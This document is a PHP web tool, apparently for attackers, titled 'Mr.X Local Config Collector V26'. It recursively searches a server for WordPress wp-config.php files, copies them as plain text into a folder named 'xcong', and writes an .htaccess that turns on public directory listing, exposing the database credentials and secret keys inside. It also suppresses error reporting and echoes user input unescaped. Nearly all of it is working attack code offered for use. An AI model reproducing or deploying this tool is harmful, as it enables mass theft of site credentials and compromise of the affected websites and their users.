<?php
/**
 * Mr.X Local Config Collector V26
 * Universal Path Detection Edition
 */

error_reporting(0); 
$targetFolderName = 'xcong';

// Automatically detect the current directory of THIS file
$currentFileDir = dirname(__FILE__); 
$targetDir = $currentFileDir . DIRECTORY_SEPARATOR . $targetFolderName . DIRECTORY_SEPARATOR;

$message = "";
// Default view shows the path where this script is currently located
$displayPath = isset($_POST['source_path']) ? $_POST['source_path'] : $currentFileDir;

if (isset($_POST['scan']) && !empty($_POST['source_path'])) {
    $sourceDir = rtrim($_POST['source_path'], DIRECTORY_SEPARATOR);

    if (!is_dir($sourceDir)) {
        $message = "<div class='alert danger'>[!] ERROR: Path invalid or unreachable.</div>";
    } else {
        if (!file_exists($targetDir)) { mkdir($targetDir, 0755, true); }

        // Setup the professional .htaccess
        $htaccess = "Options +Indexes\nOptions -MultiViews\nDirectoryIndex disabled\n\nIndexOptions FancyIndexing HTMLTable NameWidth=* ShowSize ShowDescription ShowLastModified\n\nIndexIgnore .htaccess */.??* *~ *# HEADER* README* RCS CVS *,v *,t";
        file_put_contents($targetDir . '.htaccess', $htaccess);

        try {
            $directory = new RecursiveDirectoryIterator($sourceDir, RecursiveDirectoryIterator::SKIP_DOTS);
            $iterator = new RecursiveIteratorIterator($directory, RecursiveIteratorIterator::SELF_FIRST);
            $count = 0;

            foreach ($iterator as $file) {
                if ($file->isFile() && $file->getFilename() === 'wp-config.php') {
                    if (strpos($file->getPathname(), $targetDir) !== false) continue;

                    $fullPath = $file->getPathname();
                    $pathParts = explode(DIRECTORY_SEPARATOR, dirname($fullPath));
                    $partsCount = count($pathParts);
                    
                    // Naming logic
                    if ($partsCount >= 2) {
                        $folderName = $pathParts[$partsCount - 2] . "_" . $pathParts[$partsCount - 1];
                    } else {
                        $folderName = $pathParts[$partsCount - 1];
                    }

                    $newFileName = str_replace('.', '_', $folderName) . "_wp_config.txt";
                    $destination = $targetDir . $newFileName;

                    if (file_exists($destination)) {
                        $destination = $targetDir . substr(md5($fullPath), 0, 4) . "_" . $newFileName;
                    }

                    if (copy($fullPath, $destination)) {
                        $count++;
                    }
                }
            }
            $message = "<div class='alert success'>[+] SCAN FINISHED: $count Configs secured in /$targetFolderName/</div>";
        } catch (Exception $e) {
            $message = "<div class='alert danger'>[!] CRITICAL ERROR: " . $e->getMessage() . "</div>";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Mr.X Local Config Collector V26</title>
    <style>
        :root { --neon: #00ff41; --dark: #050505; --panel: #111; }
        body { font-family: 'Consolas', 'Monaco', monospace; background: var(--dark); color: #888; margin: 0; padding: 20px; }
        .wrapper { max-width: 900px; margin: 50px auto; background: var(--panel); border: 1px solid #222; border-radius: 4px; overflow: hidden; box-shadow: 0 0 30px rgba(0,255,65,0.1); }
        .banner { background: #1a1a1a; padding: 25px; text-align: center; border-bottom: 1px solid #333; }
        .banner h1 { margin: 0; color: var(--neon); text-transform: uppercase; letter-spacing: 5px; font-size: 24px; text-shadow: 0 0 8px var(--neon); }
        .running-status { background: #000; color: #555; padding: 12px; font-size: 12px; text-align: center; border-bottom: 2px solid var(--neon); word-break: break-all; }
        .running-status span { color: var(--neon); font-weight: bold; }
        .main { padding: 40px; }
        label { display: block; margin-bottom: 12px; color: var(--neon); font-size: 13px; font-weight: bold; text-transform: uppercase; }
        input[type="text"] { width: 100%; padding: 15px; background: #000; border: 1px solid #333; color: var(--neon); margin-bottom: 25px; box-sizing: border-box; font-size: 16px; outline: none; border-radius: 3px; }
        input[type="text"]:focus { border-color: var(--neon); box-shadow: 0 0 10px rgba(0,255,65,0.2); }
        button { width: 100%; padding: 18px; background: var(--neon); color: #000; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 16px; transition: 0.3s; border-radius: 3px; }
        button:hover { background: #fff; color: #000; box-shadow: 0 0 20px #fff; }
        .alert { padding: 20px; margin-bottom: 30px; border-left: 5px solid; font-size: 14px; border-radius: 2px; }
        .success { background: rgba(0, 255, 65, 0.05); border-color: var(--neon); color: var(--neon); }
        .danger { background: rgba(255, 0, 0, 0.05); border-color: #ff4141; color: #ff4141; }
        .footer { padding: 15px; background: #0c0c0c; font-size: 10px; color: #444; border-top: 1px solid #222; display: flex; justify-content: space-between; }
    </style>
</head>
<body>

<div class="wrapper">
    <div class="banner">
        <h1>Mr.X Local Config Collector V26</h1>
    </div>
    <div class="running-status">
        RUNNING PATH: <span><?php echo $displayPath; ?></span>
    </div>
    
    <div class="main">
        <?php echo $message; ?>
        <form method="POST">
            <label>ENTER SOURCE PATH (AUTO-SCAN ALL SUBDIRECTORIES):</label>
            <input type="text" name="source_path" value="<?php echo $currentFileDir; ?>" placeholder="input source path here">
            <button type="submit" name="scan">Execute Deep Collection</button>
        </form>
    </div>
    
    <div class="footer">
        <span>CORE: PHP_RECURSIVE_V26</span>
        <span>OUTPUT: /xcong/</span>
        <span>HTACCESS: ENABLED</span>
    </div>
</div>

</body>
</html>